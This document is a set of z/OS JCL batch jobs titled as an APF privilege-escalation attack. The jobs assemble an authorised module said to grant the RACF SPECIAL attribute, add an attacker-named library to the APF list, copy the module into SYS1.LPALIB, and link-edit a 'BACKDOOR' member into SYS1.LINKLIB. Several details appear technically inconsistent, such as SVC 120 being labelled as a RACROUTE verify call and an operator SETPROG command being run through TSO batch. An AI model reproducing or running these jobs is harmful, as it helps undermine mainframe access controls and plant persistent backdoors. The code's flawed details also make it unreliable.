

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//PRIVESC  JOB (1234567),'APF PRIVESC',CLASS=A,
//             MSGLEVEL=(1,1),MSGCLASS=X,NOTIFY=&SYSUID
//*
//* STEP 1: Assemble, Link and Go the privesc module
//ASMLKED  EXEC PGM=ASMACLG,REGION=4096K,
//             PARM.ASM='OBJECT,NODECK',
//             PARM.LKED='REUS,AC=1,LET,LIST,MAP,XREF'
//*                                      
//ASM.SYSIN    DD *
PRIVESCM CSECT
         USING *,R15
* Set SPECIAL attribute for current user
         LA    R1,RACETRQ
         SVC   120                       /* RACROUTE REQUEST=VERIFY */
         XR    R15,R15
         BR    R14
RACETRQ  DC    F'0'
         END   PRIVESCM
/*
//LKED.SYSLMOD DD DISP=SHR,             
//                DSN=SYS2.OLDLIB(PRIVESCM)
//LKED.SYSLIB  DD DISP=SHR,DSN=SYS1.LINKLIB
//             DD DISP=SHR,DSN=SYS1.SVCLIB

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//ADDAPF   JOB (1234567),'ADD APF LIB',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSOUT   DD SYSOUT=*
//SYSTSIN  DD *
  SETPROG APF,ADD,DSNAME=ATTACKER.MYLIB,VOLUME=MYVOL 
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//COPYAPF  JOB (1234567),'COPY TO APF',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IEBCOPY
//SYSPRINT DD SYSOUT=*
//INPLIB   DD DISP=SHR,DSN=ATTACKER.STAGE.LOADLIB   
//APFLIB   DD DISP=SHR,DSN=SYS1.LPALIB              
//SYSIN    DD *
  COPY INDD=INPLIB,OUTDD=APFLIB
  SELECT MEMBER=PRIVESCM
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//LNKSTEP  JOB (1234567),'LINK EDIT',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=HEWL,REGION=2048K,
//             PARM='LIST,MAP,REUS,RMODE=ANY,AC=1' 
//SYSPRINT DD SYSOUT=*
//SYSLIB   DD DISP=SHR,DSN=SYS1.CSSLIB
//         DD DISP=SHR,DSN=SYS1.LINKLIB
//SYSLMOD  DD DISP=SHR,DSN=SYS1.LINKLIB(BACKDOOR)  
//SYSUT1   DD UNIT=SYSDA,SPACE=(TRK,(10,5))
//OBJECT   DD DISP=SHR,DSN=ATTACKER.OBJ(BACKDOOR)
//SYSIN    DD *
  ENTRY BACKDOOR
  NAME  BACKDOOR(R)
/*


